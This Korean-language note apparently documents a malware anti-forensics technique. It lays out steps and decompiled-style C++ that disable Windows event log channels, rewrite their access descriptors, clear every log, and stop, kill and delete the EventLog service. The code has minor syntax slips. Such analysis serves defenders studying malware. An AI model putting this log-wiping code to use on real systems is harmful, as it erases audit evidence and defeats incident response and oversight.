### Concept

악성 코드는 자신의 행위를 감추기 위해 event log를 clear함

### Code Flow

#### HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels
1. 레지스트리 키의 핸들을 획득
2. RegEnumKeyW API를 사용해 하위 키를 조회
3. Enabled 키를 0으로 변경
4. ChannelAccess 키 값은 아래 값으로 변경
	- "O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)"
5. 조회한 하위 키명을 ClearEventLogW API에 전달해 eventlog 핸들을 획득
6. ClearEventLogW API를 호출하여 eventlog를 제거

#### HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog
1. 레지스트리 키의 핸들을 획득
2. RegEnumKeyW API를 사용해 하위 키를 조회
3. 조회한 하위 키명을 ClearEventLogW API에 전달해 eventlog 핸들을 획득
4. ClearEventLogW API를 호출하여 eventlog를 제거

#### Eventlog Service
1. OS가 Windows 7이상인지 확인
2. "EventLog" 서비스를 오픈
3. ControlService API를 사용하여 서비스를 중지
4. QueryServiceStatusEx API를 사용하여 서비스 프로세스의 pid를 획득
5. 서비스 프로세스를 종료
6. DeleteService API를 사용하여 서비스 제거


### O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)

`O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)`는 보안 설명자 정의 언어(Security Descriptor Definition Language, SDDL)로 작성된 문자열.
이 문자열은 Windows 보안 객체에 대한 액세스 권한을 나타냅니다. 각 부분의 의미는 다음과 같음.

- `O:BA`: 객체 소유자(Object owner)는 내장 관리자(Built-in Admin, BA)
- `G:SY`: 기본 그룹(Primary group)은 시스템(System, SY)
- `D:`: 액세스 제어 목록(Discretionary Access Control List, DACL)
- `(A;;0x1;;;SY)`: 시스템(System, SY)에게 읽기(Read, 0x1) 권한을 허용(Allow, A)
- `(A;;0x5;;;BA)`: 내장 관리자(Built-in Admin, BA)에게 읽기(Read, 0x1) 및 쓰기(Write, 0x4) 권한을 허용(Allow, A)
- `(A;;0x1;;;LA)`: 로컬 계정(Local Account, LA)에게 읽기(Read, 0x1) 권한을 허용(Allow, A)

### Example

```c++
RegCreateKeyExW(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels",
	            0x0, NULL, 0x0, 0x2011f, NULL, &hkey_channels, NULL);
index = 0x0;
while (err = RegEnumKeyW(hkey_channels, index, key_name, 0x104), err != ERROR_NO_MORE_ITEMS) {
    hkey_iter = NULL;
    lVar1 = RegCreateKeyExW(hkey_channels, key_name, 0x0, NULL,
						  0x0, 0x2011f, NULL, &hkey_iter, NULL);
	data = 0x0;
	RegSetValueExW(hkey_iter, "Enabled", 0x0, 0x4, &data, 0x4);
	RegSetValueExW(hkey_iter, "ChannelAccess", 0x0, 0x1,
				   "O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)",0x64);
	h_eventlog = OpenEventLogW(NULL, key_name);
	ClearEventLogW(h_eventlog, NULL);
	CloseEventLog(h_eventlog);
	ZwClose(hkey_iter);
	index = index + 0x1;
}
ZwClose(hkey_channels);

RegCreateKeyExW(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\EventLog",
				0x0, 0x0, 0x0, 0x2011f, 0x0, &hkey_eventlog, 0x0);
index = 0x0;
while (err = RegEnumKeyW(hkey_eventlog, index, key_name, 0x104), err != ERROR_NO_MORE_ITEMS) {
	h_eventlog = OpenEventLogW(0x0, key_name);
	ClearEventLogW)(h_eventlog,0x0);
	CloseEventLog)(h_eventlog);
	index = index + 0x1;
}
ZwClose(hkey_eventlog);

if ("Windows 7" <= OS) {
    h_scm = OpenSCManagerW(0x0, 0x0, SC_MANAGER_CONNECT);
    h_sc = OpenServiceW(h_scm,"EventLog",0x10024);
    ControlService(h_sc, SERVICE_CONTROL_STOP, &ss);
	QueryServiceStatusEx(h_sc, SC_STATUS_PROCESS_INFO, &ssp, 0x24, &ret_len);
    TerminateServiceProcess(ssp.dwProcessId);
    DeleteService(h_sc);
    CloseServiceHandle(h_sc);
    CloseServiceHandle(h_scm);
}
```